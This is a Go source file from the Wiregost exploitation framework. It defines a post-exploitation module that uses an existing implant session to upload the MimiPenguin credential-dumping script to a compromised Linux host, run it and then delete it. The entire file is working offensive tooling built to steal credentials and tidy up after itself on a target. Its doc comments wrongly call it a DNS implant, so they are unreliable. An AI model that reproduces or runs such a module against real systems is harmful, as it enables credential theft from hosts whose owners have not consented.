// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package MimiPenguin

import (
	"fmt"
	"path/filepath"
	"strings"
	"time"

	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module"
)

// [ Base Methods ] ------------------------------------------------------------------------//

// MimiPenguin - A single stage DNS implant
type MimiPenguin struct {
	*module.Module
}

// New - Instantiates a reverse DNS module, empty.
func New() *MimiPenguin {
	mod := &MimiPenguin{&module.Module{}}
	mod.Path = []string{"post/linux/x64/bash/credentials/MimiPenguin"}
	return mod
}

var modLog = log.ServerLogger("post/linux/x64/bash/credentials/MimiPenguin", "module")

// [ Module Methods ] ------------------------------------------------------------------------//

func (s *MimiPenguin) Run(requestID int32, command string) (result string, err error) {

	// Check options
	if ok, err := s.CheckRequiredOptions(); !ok {
		return "", err
	}

	// Check session
	sess, err := s.GetSession()
	if sess == nil {
		return "", err
	}

	// Options
	src := filepath.Join(assets.GetModulesDir(), strings.Join(s.Path, "/"), "src/mimipenguin.sh")
	rpath := filepath.Join(s.Options["TempDirectory"].Value, "mimipenguin.sh")
	timeout := time.Second * 30

	// Upload MimiPenguin script on target
	upload := fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value)
	s.ModuleEvent(requestID, upload)
	result, err = s.Upload(src, rpath, timeout)
	if err != nil {
		return "", err
	} else {
		s.ModuleEvent(requestID, result)
	}

	// Execute Script
	running := fmt.Sprintf("Running script ...")
	s.ModuleEvent(requestID, running)
	time.Sleep(time.Millisecond * 500)
	result, err = s.Execute(rpath, []string{}, timeout)
	if err != nil {
		return "", err
	} else {
		s.ModuleEvent(requestID, result)
	}

	// Delete script
	deleting := fmt.Sprintf("Deleting script ...")
	s.ModuleEvent(requestID, deleting)
	result, err = s.Remove(rpath, timeout)
	if err != nil {
		return "", err
	} else {
		s.ModuleEvent(requestID, result)
	}

	return "Module executed", nil
}
